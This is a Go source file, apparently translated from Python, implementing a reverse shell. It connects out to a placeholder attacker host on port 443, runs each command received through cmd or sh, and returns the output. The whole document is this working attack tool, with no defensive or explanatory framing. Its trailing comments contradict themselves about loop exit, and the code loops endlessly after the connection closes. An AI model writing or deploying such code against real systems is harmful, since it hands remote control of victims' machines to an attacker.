// windows
package main

import (
	"fmt"
	"io"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

const (
	LHOST      = "IP_ADDRESS"
	LPORT      = 443
	BUFFERRSize = 1024
)

func main() {
	client, err := net.Dial("tcp", fmt.Sprintf("%s:%d", LHOST, LPORT))
	if err != nil {
		return
	}
	defer client.Close()

	buf := make([]byte, BUFFERRSize)

	for {
		func() {
			defer func() {
				if r := recover(); r != nil {
					_, _ = client.Write([]byte(fmt.Sprintf("error %v", r)))
				}
			}()

			n, err := client.Read(buf)
			if err != nil {
				if err == io.EOF {
					return
				}
				_, _ = client.Write([]byte(fmt.Sprintf("error %v", err)))
				return
			}
			if n == 0 {
				return
			}

			command := strings.TrimSpace(string(buf[:n]))

			if len(command) >= 0 {
				var cmd *exec.Cmd
				if runtime.GOOS == "windows" {
					cmd = exec.Command("cmd", "/C", command)
				} else {
					cmd = exec.Command("sh", "-c", command)
				}

				output, _ := cmd.CombinedOutput()
				_, _ = client.Write(output)
			}
		}()

		// If the remote closed the connection, exit the loop.
		// (Python breaks on empty recv; Go surfaces that as EOF or zero bytes.)
		// We detect this by attempting a non-blocking check would be complex; instead,
		// we rely on Read returning EOF/0 and return from the closure, then continue.
		// To preserve behavior, we break when Read returned EOF/0 (handled above via return).
		// Since we can't distinguish here, we attempt a read in the next iteration; if closed, it'll EOF.
	}
}
